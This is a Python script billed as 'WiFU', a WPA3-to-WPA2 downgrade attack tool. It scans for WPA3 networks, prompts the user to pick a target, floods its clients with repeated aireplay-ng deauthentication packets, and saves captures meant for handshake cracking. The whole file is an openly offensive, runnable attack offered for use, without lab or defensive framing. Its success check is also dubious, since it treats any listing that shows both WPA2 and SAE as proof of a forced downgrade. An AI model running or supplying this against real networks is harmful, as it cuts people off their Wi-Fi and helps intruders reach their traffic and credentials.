#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import argparse
import subprocess
import datetime
import signal
import re
from threading import Thread

# Ensure we're in the correct directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOGS_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "logs")

# Create logs directory if it doesn't exist
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)

# Global variables
stop_threads = False

def signal_handler(sig, frame):
    global stop_threads
    print('\n[!] Attack interrupted by user. Cleaning up...')
    stop_threads = True
    time.sleep(1)
    # Reset wifi adapter
    subprocess.run(['airmon-ng', 'stop', args.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', args.interface.replace('mon', ''), 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Interface reset to managed mode.")
    sys.exit(0)

def check_root():
    """Check if script is run as root"""
    if os.geteuid() != 0:
        print("[!] This script must be run as root.")
        sys.exit(1)

def check_tools():
    """Check if required tools are installed"""
    tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "hcxdumptool"]
    for tool in tools:
        if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
            print(f"[!] Required tool '{tool}' is not installed.")
            print(f"[!] Please install {'aircrack-ng' if tool.startswith('air') else 'hcxtools'} package.")
            sys.exit(1)

def setup_interface(interface):
    """Set up wireless interface for monitoring"""
    print(f"[*] Setting up {interface} for monitoring...")
    
    # Kill processes that might interfere with monitoring
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL)
    
    # Set interface to monitor mode
    subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL)
    
    # Determine monitor interface name (usually interface + mon)
    mon_interface = interface
    if "mon" not in interface:
        mon_interface = f"{interface}mon"
        # Check if the mon interface exists, otherwise use the original
        result = subprocess.run(['ip', 'a', 'show', mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if result.returncode != 0:
            mon_interface = interface
    
    print(f"[+] Interface {mon_interface} ready in monitor mode")
    return mon_interface

def scan_for_wpa3_networks(mon_interface):
    """Scan for WPA3 networks"""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    scan_file = os.path.join(LOGS_DIR, f"scan_{timestamp}")
    
    print("[*] Scanning for WPA3 networks...")
    
    # Start airodump-ng in a separate process for 15 seconds
    scan_proc = subprocess.Popen(
        ['airodump-ng', '-w', scan_file, '--output-format', 'csv', mon_interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    # Let it run for 15 seconds
    time.sleep(15)
    scan_proc.terminate()
    scan_proc.wait()
    
    # Parse the CSV file
    csv_file = f"{scan_file}-01.csv"
    wpa3_networks = []
    
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            
        # Find where the client list starts
        try:
            station_index = lines.index('\r\n') if '\r\n' in lines else lines.index('\n')
            ap_lines = lines[1:station_index]
            
            for line in ap_lines:
                if ',' not in line:
                    continue
                    
                parts = [part.strip() for part in line.split(',')]
                if len(parts) >= 14:
                    bssid = parts[0]
                    channel = parts[5]
                    essid = parts[13].strip()
                    encryption = parts[6].strip()
                    
                    # Look for WPA3 networks (SAE) or WPA2/WPA3 transition mode
                    if essid and ('SAE' in encryption or 'WPA3' in encryption):
                        wpa3_networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid,
                            'encryption': encryption
                        })
        except (ValueError, IndexError) as e:
            print(f"[!] Error parsing scan results: {e}")
    else:
        print(f"[!] Scan file not found: {csv_file}")
    
    # Clean up temporary files
    for ext in ['csv', 'netxml']:
        file_path = f"{scan_file}-01.{ext}"
        if os.path.exists(file_path):
            os.remove(file_path)
    
    return wpa3_networks

def deauth_thread(mon_interface, target_bssid, target_channel):
    """Thread to continuously send deauthentication packets"""
    global stop_threads
    
    print(f"[*] Starting deauthentication attack on {target_bssid} (channel {target_channel})")
    
    while not stop_threads:
        # Deauthenticate all clients on the network
        subprocess.run([
            'aireplay-ng',
            '--deauth', '10',  # Send 10 deauth packets
            '-a', target_bssid,  # Target AP
            '--ignore-negative-one',  # Ignore failures
            mon_interface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(2)  # Wait 2 seconds between bursts

def monitor_mode_thread(mon_interface, target_bssid, target_essid, target_channel):
    """Thread to monitor for transition mode"""
    global stop_threads
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    capture_file = os.path.join(LOGS_DIR, f"downgrade_capture_{timestamp}")
    
    print(f"[*] Monitoring {target_essid} for downgrade to transition mode...")
    
    # Start airodump-ng focused on the target network
    cmd = [
        'airodump-ng',
        '-c', target_channel,
        '--bssid', target_bssid,
        '-w', capture_file,
        '--output-format', 'csv',
        mon_interface
    ]
    
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    transition_detected = False
    start_time = time.time()
    check_interval = 5  # Check every 5 seconds
    
    try:
        while not stop_threads:
            # Wait before checking
            time.sleep(check_interval)
            
            # Check if the CSV file exists
            csv_file = f"{capture_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                # Look for transition mode indicators in the encryption field
                if "WPA2" in content and ("SAE" in content or "WPA3" in content):
                    print("\n[+] SUCCESS! WPA3 network downgraded to WPA2/WPA3 transition mode")
                    print(f"[+] Target AP {target_essid} ({target_bssid}) now accepting WPA2 connections")
                    print("[+] You can now capture a standard WPA2 handshake!")
                    transition_detected = True
                    break
            
            # Check if we've been running for too long
            elapsed = time.time() - start_time
            print(f"[*] Downgrade attempt in progress... {int(elapsed)}s elapsed", end="\r")
            
            if elapsed > 120:  # 2 minutes timeout
                print("\n[!] Timeout reached. No transition to WPA2 detected.")
                print("[!] This network may not be vulnerable to downgrade attacks.")
                break
                
    except KeyboardInterrupt:
        print("\n[!] Monitoring interrupted")
    finally:
        stop_threads = True
        if process.poll() is None:
            process.terminate()
            process.wait()
        
        # Clean up temporary files
        for ext in ['csv', 'netxml', 'cap']:
            file_path = f"{capture_file}-01.{ext}"
            if os.path.exists(file_path):
                if ext == 'cap' and transition_detected:
                    print(f"[+] Capture file saved to: {file_path}")
                else:
                    os.remove(file_path)

def reset_interface(interface):
    """Reset interface to managed mode"""
    print("[*] Resetting interface to managed mode...")
    subprocess.run(['airmon-ng', 'stop', interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface.replace('mon', ''), 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Interface reset complete.")

def downgrade_wpa3(mon_interface, target_bssid, target_channel, target_essid):
    """Run the WPA3 to WPA2 downgrade attack"""
    global stop_threads
    stop_threads = False
    
    print(f"[*] Starting WPA3 downgrade attack on {target_essid} ({target_bssid})")
    print("[*] This attack forces WPA3 networks into WPA2/WPA3 transition mode")
    print("[*] Press Ctrl+C to stop the attack")
    
    # Start the deauthentication thread
    deauth = Thread(target=deauth_thread, args=(mon_interface, target_bssid, target_channel))
    deauth.daemon = True
    deauth.start()
    
    # Start the monitoring thread
    monitor = Thread(target=monitor_mode_thread, args=(mon_interface, target_bssid, target_essid, target_channel))
    monitor.daemon = True
    monitor.start()
    
    try:
        # Wait for threads to complete
        while not stop_threads and (deauth.is_alive() or monitor.is_alive()):
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        stop_threads = True
    
    # Wait for threads to finish
    if deauth.is_alive():
        deauth.join(timeout=1)
    if monitor.is_alive():
        monitor.join(timeout=1)

def main():
    check_root()
    check_tools()
    
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    mon_interface = setup_interface(args.interface)
    
    if args.bssid and args.channel and args.essid:
        downgrade_wpa3(mon_interface, args.bssid, args.channel, args.essid)
    else:
        # Scan for WPA3 networks
        wpa3_networks = scan_for_wpa3_networks(mon_interface)
        
        if not wpa3_networks:
            print("[!] No WPA3 networks found in range. Try scanning again.")
            reset_interface(mon_interface)
            sys.exit(1)
        
        # Display available WPA3 networks
        print("\nWPA3 Networks Detected:")
        print("----------------------")
        for i, network in enumerate(wpa3_networks):
            print(f"{i+1}. {network['essid']} (BSSID: {network['bssid']}, Channel: {network['channel']}, Encryption: {network['encryption']})")
        
        # Ask user to select a target
        selection = input("\nSelect network to target (number) or 'q' to quit: ")
        if selection.lower() == 'q':
            reset_interface(mon_interface)
            sys.exit(0)
        
        try:
            index = int(selection) - 1
            if 0 <= index < len(wpa3_networks):
                target = wpa3_networks[index]
                downgrade_wpa3(
                    mon_interface,
                    target['bssid'],
                    target['channel'],
                    target['essid']
                )
            else:
                print("[!] Invalid selection.")
        except ValueError:
            print("[!] Invalid input.")
    
    # Reset interface
    reset_interface(mon_interface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WiFU: WPA3 to WPA2 Downgrade Attack Tool")
    parser.add_argument('-i', '--interface', required=True, help='Wireless interface to use')
    parser.add_argument('-b', '--bssid', help='Target BSSID (optional)')
    parser.add_argument('-c', '--channel', help='Target channel (optional)')
    parser.add_argument('-e', '--essid', help='Target ESSID/name (optional)')
    
    args = parser.parse_args()
    
    main()
